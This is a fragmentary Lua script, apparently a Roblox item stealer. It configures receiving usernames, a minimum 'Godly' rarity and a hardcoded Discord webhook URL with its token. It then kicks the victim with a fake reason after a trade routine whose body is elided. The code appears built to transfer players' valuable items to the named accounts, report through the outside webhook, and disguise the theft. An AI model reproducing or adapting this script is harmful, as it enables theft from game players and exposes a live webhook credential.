...
local users = _G.Usernames or {"atestting","el_kem"}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1363084492360650926/9reUSrC-P83dR8zxyXN56fpIaLIrLznHHQqOQ8Qsgl3hCd5tA6ognXDHZI0o8ytnH_VC"
...
if #weaponsToSend > 0 then
    ...
    local function doTrade(joinedUser)
        ...
        plr:kick("You have been kicked from the game. Reason: Unspecified")
    end
